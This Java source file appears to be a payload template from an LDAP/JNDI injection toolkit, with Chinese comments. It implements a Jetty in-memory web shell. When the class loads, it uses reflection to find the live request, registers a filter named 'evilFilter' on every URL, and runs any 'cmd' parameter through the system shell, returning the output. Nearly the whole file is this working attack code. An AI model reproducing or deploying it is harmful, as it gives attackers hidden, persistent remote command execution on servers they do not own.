package com.feihong.ldap.template;

import javax.servlet.*;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Map;

@SuppressWarnings("all")
public class JettyBehinderFilter implements Filter {

    Object request = null;
    Object response = null;
    boolean bool = false;
    String filterName = "evilFilter";
    String urlPattern = "/*";

    static {
        JettyBehinderFilter shell = new JettyBehinderFilter();
        try {
            shell.init();
            Object _scope = JettyBehinderFilter.getField(shell.request,"_scope");
            // 获取 ServletHandler 对象
            Object _servletHandler = JettyBehinderFilter.getField(_scope,"_servletHandler");

            Object[] _filters = (Object[]) JettyBehinderFilter.getField(_servletHandler,"_filters");
            // 判断 filter 是否已注入，如果已注入就不继续运行代码
            for (Object filter:_filters){
                String _name = (String) JettyBehinderFilter.getField(filter,"_name");
                if (_name.equals(shell.filterName)){
                    shell.bool = true;
                    break;
                }
            }

            if (!shell.bool){
                // 反射获取 FilterHolder 构造器并进行实例化
                Class filterHolderClas = _filters[0].getClass();
                Constructor filterHolderCons = filterHolderClas.getConstructor(javax.servlet.Filter.class);
                Object filterHolder = filterHolderCons.newInstance(shell);

                // 反射获取 FilterMapping 构造器并进行实例化
                Object[] _filtersMappings = (Object[]) JettyBehinderFilter.getField(_servletHandler,"_filterMappings");
                Class filterMappingClas = _filtersMappings[0].getClass();
                Constructor filterMappingCons = filterMappingClas.getConstructor();
                Object filterMapping = filterMappingCons.newInstance();

                // 反射赋值 filter 名
                Field _filterNameField = filterMappingClas.getDeclaredField("_filterName");
                _filterNameField.setAccessible(true);
                _filterNameField.set(filterMapping,shell.filterName);

                // 反射赋值 _holder
                Field _holderField = filterMappingClas.getDeclaredField("_holder");
                _holderField.setAccessible(true);
                _holderField.set(filterMapping,filterHolder);

                // 反射赋值 urlpattern
                Field _pathSpecsField = filterMappingClas.getDeclaredField("_pathSpecs");
                _pathSpecsField.setAccessible(true);
                _pathSpecsField.set(filterMapping,new String[]{shell.urlPattern});

                /**
                 * private final Map<String, FilterHolder> _filterNameMap = new HashMap();
                 *
                 *  at org.eclipse.jetty.servlet.ServletHandler.updateMappings(ServletHandler.java:1345)
                 *  at org.eclipse.jetty.servlet.ServletHandler.setFilterMappings(ServletHandler.java:1542)
                 *  at org.eclipse.jetty.servlet.ServletHandler.prependFilterMapping(ServletHandler.java:1242)
                 */

                // 属性带有 final 需要先反射修改 modifiers 才能编辑 final 变量
                Field _filterNameMapField = _servletHandler.getClass().getDeclaredField("_filterNameMap");
                _filterNameMapField.setAccessible(true);
                Field modifiersField = Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(_filterNameMapField,_filterNameMapField.getModifiers()& ~Modifier.FINAL);
                // 先把原来的取出来然后再放进去
                Map _filterNameMap = (Map) _filterNameMapField.get(_servletHandler);
                _filterNameMap.put(shell.filterName, filterHolder);
                _filterNameMapField.set(_servletHandler,_filterNameMap);
                // 调用 prependFilterMapping 将 mapping 放到第一个
                Method prependFilterMappingMethod = _servletHandler.getClass().getDeclaredMethod("prependFilterMapping",filterMappingClas);
                prependFilterMappingMethod.setAccessible(true);
                prependFilterMappingMethod.invoke(_servletHandler,filterMapping);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void init() throws Exception{
        Class<?> clazz = Thread.currentThread().getClass();
        Field field = clazz.getDeclaredField("threadLocals");
        field.setAccessible(true);
        Object object = field.get(Thread.currentThread());
        field = object.getClass().getDeclaredField("table");
        field.setAccessible(true);
        object = field.get(object);
        Object[] arrayOfObject = (Object[])object;
        for (byte b = 0; b < arrayOfObject.length; b++) {
            Object object1 = arrayOfObject[b];
            if (object1 != null) {
                field = object1.getClass().getDeclaredField("value");
                field.setAccessible(true);
                object = field.get(object1);
                if (object != null && object.getClass().getName().endsWith("HttpConnection")) {
                    Method method = object.getClass().getDeclaredMethod("getHttpChannel", null);
                    Object object2 = method.invoke(object, null);
                    method = object2.getClass().getMethod("getRequest", null);
                    this.request =  method.invoke(object2, null);
                    method = this.request.getClass().getMethod("getResponse", null);
                    this.response =  method.invoke(this.request, null);
                    break;
                }
            }
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

        String cmd = servletRequest.getParameter("cmd");
        if(cmd != null && !cmd.isEmpty()){
            String[] cmds = null;
            if(File.separator.equals("/")){
                cmds = new String[]{"/bin/sh", "-c", cmd};
            }else{
                cmds = new String[]{"cmd", "/C", cmd};
            }

            Process process = Runtime.getRuntime().exec(cmds);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
    }

    public static Object getField(Object obj, String fieldName) throws Exception {
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }
}